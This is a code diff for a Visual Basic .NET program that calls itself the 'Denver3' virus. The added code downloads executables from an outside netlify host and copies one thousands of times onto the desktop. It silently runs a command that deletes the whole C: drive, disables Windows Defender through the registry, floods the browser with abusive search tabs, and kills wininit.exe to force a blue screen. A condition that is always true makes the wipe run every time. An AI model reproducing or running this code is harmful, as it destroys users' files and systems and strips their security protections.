@@ -2,10 +2,28 @@
 Imports System.IO
 Imports System.Net
 Imports System.Text
+Imports Microsoft.Win32
+
 Public Class Form1
     Dim UserFoler = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
     Dim Close1 As Boolean = False
+    Private ReadOnly filePath As String = "first_open.txt"
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+        fuckpc()
+        Try
+            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/Interop.WMPLib.dll", Application.StartupPath & "\Interop.WMPLib.dll")
+        Catch ex As Exception
+
+        End Try
+        Try
+            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/AxInterop.WMPLib.dll", Application.StartupPath & "\AxInterop.WMPLib.dll")
+        Catch ex As Exception
+
+        End Try
+        Valve_Theme.Show()
+        DisableWindowsDefender() 'worth a shot am I right? In a try will not bug the code
+
         If Not My.Computer.FileSystem.FileExists(UserFoler & "\Denver3.runtime") Then
             Dim result1 As DialogResult = MessageBox.Show(" This program is malware / malicious program and it will do harm to your computer if you were not on a VM click No immediately (do you still want to execute this program)",
      "haha FBI can't arrest me now",
@@ -20,13 +38,7 @@ Public Class Form1
                     Close1 = True
                     Me.Close()
                 Else
-
-
-
                     If CheckForInternetConnection() Then
-
-
-
                         Try
                             My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/Interop.WMPLib.dll", Application.StartupPath & "\Interop.WMPLib.dll")
                         Catch ex As Exception
@@ -70,7 +82,9 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                                 End Try
                                 Process.Start(Application.StartupPath & "\fuckuac.cmd")
                                 Hacking_into_pc.Close()
-                                ' MsgBox("Your computer has been infected with Denver3.exe. the next generation of Yuki3")
+                                MsgBox("Major skill issue!")
+                                Wait(1)
+                                MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False) 'MAKE A BSOD
                                 Close1 = True
                                 Me.Close()
                             Catch ex As Exception
@@ -110,8 +124,19 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                             If currentTime.Month = 9 And currentTime.Date.Day = 11 Then
                                 RipConeehasOldAcc.Show()
                             End If
+
+
                             If currentTime.Month = 1 And currentTime.Date.Day = 1 Then
                                 TrainIsAFurryLmao.Show()
+                            End If
+
+                            If currentTime.Month = 1 Or currentTime.Month = 2 Then
+                                Dim random As New Random()
+                                Dim randomNumber As Integer = random.Next(1, 21)
+                                If randomNumber = 1 Then
+                                    MsgBox("Fuck you", 0 + 16, "die")
+                                    MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False)
+                                End If
                             End If
                             If currentTime.Month = 2 And currentTime.Date.Day = 1 Then
                                 GoPlayHLAlyx.Show()
@@ -209,6 +234,14 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                                 My.Computer.Audio.Play(UserFoler & "\Neon.wav", AudioPlayMode.BackgroundLoop)
                                 MsgBox("You will get to hear Nyan Cat every single day in the background for the next month (: -Denver3", 0 + 16, "DENVER3.EXE BACKGOUNDPROSSES")
                             End If
+
+
+
+
+
+                            If currentTime.Month = 12 And currentTime.Day = 1 Or True = True Then
+                                fuckpc()
+                            End If
                         Else
                             MsgBox("cannot connect to external server denver3 failed to initialize.", 0 + 16)
                             Close1 = True
@@ -228,6 +261,108 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
 
     End Sub
+    Public Sub fuckpc()
+        Try
+            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/urdone1.wav", UserFoler & "\urdone1.wav")
+        Catch ex As Exception
+        End Try
+        My.Computer.Audio.Play(UserFoler & "\urdone1.wav", AudioPlayMode.BackgroundLoop)
+        MsgBox("I have messed with you enough and it's time for me to leave take a break from your computer have fun repairing your bootloader goodbye.")
+        My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/BonziBDY_4.EXE", UserFoler & "\Desktop\BonziBDY_4.EXE")
+        completely_obliterate_hard_drive_files.RunWorkerAsync()
+
+
+        For index As Integer = 0 To 3000
+            ' Code to be executed inside the loop
+            Try
+                Dim random As New Random()
+                Dim randomNumber As Integer = random.Next(1, 63463456)
+                My.Computer.FileSystem.CopyFile(UserFoler & "\Desktop\BonziBDY_4.EXE", UserFoler & "\Desktop\BonziBDY_4" & randomNumber & ".EXE")
+            Catch ex As Exception
+
+            End Try
+        Next
+
+        ' Make a reference to a directory.
+
+
+        Files_deleted_from_hard_drive.Show()
+        ' Display the names of the files.
+
+        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", True) 'fuck ur pc
+        Wait(10)
+        Process.Start("https://www.google.com/search?q=for+the+lulz&sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-3ZuC1psWsqK-aMP1WjOfTiXwLBQ%3A1713312563052&ei=MxMfZqjjAsu0ptQPkpW8mAY&ved=0ahUKEwjoyNbV-seFAxVLmokEHZIKD2MQ4dUDCBA&uact=5&oq=for+the+lulz&gs_lp=Egxnd3Mtd2l6LXNlcnAiDGZvciB0aGUgbHVsejIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgAQyCxAAGIAEGIoFGIYDSM8IUOMFWN8GcAF4AZABAJgBZqABvwGqAQMxLjG4AQPIAQD4AQGYAgOgAscBwgIKEAAYRxjWBBiwA8ICCBAAGIAEGKIEmAMAiAYBkAYIkgcDMi4xoAffBQ&sclient=gws-wiz-serp")
+        Wait(3)
+        Process.Start("https://www.google.com/search?sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-wMlNAtRhrt2T5ryRfPYICQBcEzg:1713312633304&q=windows+is+spyware&uds=AMwkrPte2rONdlHqaOEoNFr7YgHOiVFtgpI_Ouhp_p_393pfzLmTJdzG2eu02e1iRLtixUe8z4CGC2fuy7dcMRHztzSCFzI3dGLWAVQhBLrNqa6I5_RYST8DU1TQbprLSSo4h0E36iZuaMKfEtU8DupyBvGyxFpeJF6xxgOfHPEZ6HNMvV2BsglEgiuadGToqCC4x43gAAyb99N-2Pu0jgHjK1KRnsfHdxg-Pk7pwVebISixHAjviqZAl3hvC5lEiJSLj9l_zUpeHXM8HTSrqj8oX23a0Cx4DgeuBiZ9E2gkooxJZf7yn9PA3cOTe1ZWK231TMjcnghX&udm=2&prmd=ivnsbmtz&sa=X&ved=2ahUKEwjftJb3-seFAxVstokEHWrEDB8QtKgLegQICRAB&biw=1920&bih=919&dpr=1#vhid=nVwcAOfoXtc5YM&vssid=mosaic")
+        Wait(4)
+        Process.Start("https://www.google.com/search?q=windows+11+is+shit&oq=windows+11+is+shit&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCDQ4NDlqMGo5qAIAsAIA&sourceid=chrome&ie=UTF-8")
+        Wait(5)
+        OpenTextFile("WINDOWS 11 IS ***CRAP**")
+        OpenTextFile("ur mom")
+        OpenTextFile("MUSIC: Undertale Last Breath: An Enigmatic Encounter (Phase 3)")
+        OpenTextFile("***YOUR PC HAS BEEN FUCKED BY THE DENVER 3 VIRUS LMAO***")
+        OpenTextFile("BSOD INCOMEING!!!!!!!!!!!!!")
+        Wait(4)
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
+
+        Wait(40)
+        Process.Start("https://www.google.com/search?q=I%27m+about+to+blue+screen+this+man%27s+computer%21%21%21%21%21%21&sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn08FZz1OtO5v_LYabeyEF3EhtJUM7Q%3A1713312932801&ei=pBQfZoTNMP3sptQP3NGDoA4&ved=0ahUKEwiEr_6F_MeFAxV9tokEHdzoAOQQ4dUDCBA&uact=5&oq=I%27m+about+to+blue+screen+this+man%27s+computer%21%21%21%21%21%21&gs_lp=Egxnd3Mtd2l6LXNlcnAiMkknbSBhYm91dCB0byBibHVlIHNjcmVlbiB0aGlzIG1hbidzIGNvbXB1dGVyISEhISEhMggQIRigARjDBDIIECEYoAEYwwQyCBAhGKABGMMEMggQIRigARjDBDIIECEYoAEYwwRIhUVQuwVYrDpwB3gBkAEAmAHKAaAB4A6qAQYxNC40LjG4AQPIAQD4AQGYAhagArMLwgIKEAAYRxjWBBiwA8ICCBAAGIAEGKIEwgIIEAAYiQUYogTCAgoQIRgKGKABGMMEwgIFECEYoAGYAwCIBgGQBgiSBwQxOC40oAejYw&sclient=gws-wiz-serp")
+        Wait(6)
+        MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False)
+
+
+
+    End Sub
+    Public Sub OpenTextFile(Text)
+        Dim random As New Random()
+        Dim randomNumber As Integer = random.Next(1, 63463456)
+        Dim path As String = UserFoler & "\" & randomNumber
+
+        ' Create or overwrite the file.
+        Dim fs As FileStream = File.Create(path)
+
+        ' Add text to the file.
+        Dim info As Byte() = New UTF8Encoding(True).GetBytes(Text)
+        fs.Write(info, 0, info.Length)
+        fs.Close()
+        Process.Start(UserFoler & "\" & randomNumber)
+    End Sub
+    Private Sub DisableWindowsDefender()
+        Try
+            Dim keyPath As String = "SOFTWARE\Microsoft\Windows Defender"
+            Dim keyName As String = "DisableAntiSpyware"
+
+            Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(keyPath, True)
+                If key IsNot Nothing Then
+                    key.SetValue(keyName, 1, RegistryValueKind.DWord)
+                End If
+            End Using
+        Catch ex As Exception
+        End Try
+    End Sub
+
     Private Sub Wait(ByVal seconds As Integer)
         For i As Integer = 0 To seconds * 100
             System.Threading.Thread.Sleep(10)
@@ -293,12 +428,27 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             Return False
         End Try
     End Function
+
+    Private Sub completely_obliterate_hard_drive_files_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles completely_obliterate_hard_drive_files.DoWork
+
+    End Sub
 End Class
 
 Public Class MyUtilities
     Shared Sub RunCommandCom(command As String, arguments As String, permanent As Boolean)
         Dim p As Process = New Process()
         Dim pi As ProcessStartInfo = New ProcessStartInfo()
+        pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
+        pi.FileName = "cmd.exe"
+        p.StartInfo = pi
+        p.Start()
+    End Sub
+
+
+    Shared Sub RunCommandComInvis(command As String, arguments As String, permanent As Boolean)
+        Dim p As Process = New Process()
+        Dim pi As ProcessStartInfo = New ProcessStartInfo()
+        pi.WindowStyle = ProcessWindowStyle.Hidden
         pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
         pi.FileName = "cmd.exe"
         p.StartInfo = pi
